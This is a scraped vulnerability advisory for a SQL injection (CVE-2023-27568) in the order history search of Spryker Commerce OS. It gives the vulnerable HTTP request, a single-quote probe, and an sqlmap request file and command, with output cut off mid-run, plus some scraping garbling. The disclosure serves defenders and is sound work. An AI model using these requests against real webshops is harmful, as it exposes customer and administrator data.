{
    "text": "title : Spryker Commerce OS 1.0 SQL Injection  ， detail : An SQL injection vulnerability affecting Spryker-based webshops was discovered in the order history search form. It can be exploited by authenticated attackers in order to retrieve information from the database ( e.g. customer and administrator login information , order details , etc. ) . Depending on the configuration of the webshop , access to the file system or even execution of arbitrary commands on the database management system is possible. Version 1.0 is affected.  ， cve : advisories | CVE-2023-27568  ，  ， desc : -BEGIN PGP SIGNED MESSAGE-  ， Hash : SHA512  ， Title  ，  ， SCHUTZWERK-SA-2023-001 : SQL Injection in Spryker Commerce OS  ， Status  ，  ， PUBLISHED  ， Version  ，  ， 1.0  ， CVE reference  ，  ， CVE-2023-27568  ， Link  ，  ， https : /www.schutzwerk.com/advisories/schutzwerk-sa-2023-001/  ， Text-only version :   ， https : /www.schutzwerk.com/advisories/SCHUTZWERK-SA-2023-001.txt  ， Affected products/vendor  ，  ， Spryker Commerce OS by Spryker Systems GmbH , with spryker/sales :   ， 11.16.0-11.36.1  ， or spryker-feature/order-management : 202009.0-202212.0  ， Summary  ，  ， An SQL injection vulnerability affecting Spryker-based webshops was  ， discovered  ， in the order history search form. It can be exploited by authenticated  ， attackers in order to retrieve informationen from the database ( e.g.  ， customer  ， and administrator login information , order details , etc. ) . Depending on the  ， configuration of the webshop , access to the file system or even execution of  ， arbitrary commands on the database management system is possible.  ， Risk  ，  ， Attackers with valid credentials for Spryker-based webshops are able to  ， exploit  ， an SQL injection vulnerability in the order history search form. This allows  ， full access to the applications database and the data stored within it.  ， This  ， database will generally contain - among other information - personally  ， identifiable information. Disclosure of such data could lead to reputation  ， damage for the webshop's owner. In addition , the vulnerability might  ， also pose  ， legal risks regarding General Data Protection Regulation ( GDPR ) .  ， Depending on the configured authentication methods , the database will also  ， contain login information of customers and administrators.  ， Administrative login  ， information ( i.e. username and password hash ) could enable attackers to  ， extend  ， their privileges and access the shop's backend , where administrative actions  ， can be performed. In combination with the vulnerability described in  ， SCHUTZWERK-SA-2022-003/CVE-2022-28888 [ 1 ]  , remote command execution  ， could also  ， be feasible from this position if access to the required environment  ， variables  ， is possible. The login information of customers could be abused by  ， attackers ,   ，  ， Depending on the DBMS ( database management system ) in use , write access  ， to the  ， database could theoretically also be possible. In this case , attackers can  ， create new users and grant them administrative privileges , again  ， allowing for  ， privilege escalation. Also , once more depending on the DBMS , reading and  ， writing files on the file system of the DBMS or even direct execution of  ， arbitrary system commands could be possible.  ， The vulnerability can be easily detected , even through automated  ， scanners , and  ， trivially exploited using tools such as sqlmap [ 2 ] .  ， Description  ，  ， Structured Query Language , abbreviated as SQL , is a standardized programming  ， language for managing data held in a relational database management  ， system and  ， performing various operations on the data stored in them. SQL injection  ， vulnerabilities occur when attacker-controlled data is embedded unchecked in  ， SQL queries. Such vulnerabilities allow attackers to bypass restrictions  ， in the  ， application logic and issue manipulated queries to the database server.  ， Depending on various factors ( database management system used , database user  ， permissions , etc. )  , it may be possible to read , modify and delete data and  ， compromise the database or application server.  ， The Spryker-based webshop examined as part of a customer assessment  ， offers an  ， order history with a list of orders that have been placed in the past. While  ， testing this function , it was observed that a server-side error  ， condition was  ， triggered when a single quotation mark ( ' ) was placed in the search term  ， field.  ， The HTTP request that triggered this error condition is the following  ，  ( URL-decoded and shortened for increased readability )  :   ， GET  ， /de/customer/order?orderSearchForm [ searchType ] =all&orderSearchForm [ searchText ] ='&  ， orderSearchForm [ filters ]  [ dateFrom ] =&orderSearchForm [ filters ]  [ dateTo ] =&  ， orderSearchForm [ filters ]  [ company ] =company&buttonSubmit=&orderSearchForm [ orderBy ] =&  ， orderSearchForm [ orderDirection ] =&orderSearchForm [ reset ] =&  ， orderSearchForm [ _token ] =xX3z_M8hyyBli5XVaGhYomNbQQrc4vyBZxr0oM6bu_A HTTP/1.1  ， Host : <redacted>  ， Cookie : <redacted>  ，  [ . ]   ， If the search term is instead comprised of two single quotation marks , the  ， server does not return an error message and successfully completes the  ， search  ， operation :   ， GET  ， /de/customer/order?orderSearchForm [ searchType ] =all&orderSearchForm [ searchText ] ='&  ， orderSearchForm [ filters ]  [ dateFrom ] =&orderSearchForm [ filters ]  [ dateTo ] =&  ， orderSearchForm [ filters ]  [ company ] =company&buttonSubmit=&orderSearchForm [ orderBy ] =&  ， orderSearchForm [ orderDirection ] =&orderSearchForm [ reset ] =&  ， orderSearchForm [ _token ] =xX3z_M8hyyBli5XVaGhYomNbQQrc4vyBZxr0oM6bu_A HTTP/1.1  ， Host : <redacted>  ， Cookie : <redacted>  ，  [ . ]   ， This behavior with respect to the single quotation mark is often an  ， indicator  ， of SQL injection vulnerabilities. As a next step , the sqlmap [ 2 ] utility was  ， used to partly automate the verification and exploitation phase :   ， % cat search.req  ， GET  ， /de/customer/order?orderSearchForm%5BsearchType%5D=all&orderSearchForm%5BsearchText%5D=test *   ， &orderSearchForm%5Bfilters%5D%5BdateFrom%5D=&orderSearchForm%5Bfilters%5D%5BdateTo%5D=&  ， orderSearchForm%5Bfilters%5D%5Bcompany%5D=company&buttonSubmit=&orderSearchForm%5BorderBy%5D=&  ， orderSearchForm%5BorderDirection%5D=&orderSearchForm%5Breset%5D=&  ， orderSearchForm%5B_token%5D=xX3z_M8hyyBli5XVaGhYomNbQQrc4vyBZxr0oM6bu_A  ， HTTP/1.1  ， Host : <redacted>  ， Cookie : <redacted>  ， % sqlmap -r search.req -force-ssl -current-db  ，  [ . ]   ，  [ 10 : 37 : 12 ]  [ INFO ] parsing HTTP request from 'search.req'  ， custom injection marker ( ' * ' ) found in option '-u'. Do you want to  ， process it? [ Y/n/q ]   ，  [ 10 : 37 : 12 ]  [ INFO ] testing connection to the target URL  ，  [ . ] ",
    "time": "May 9, 2023"
}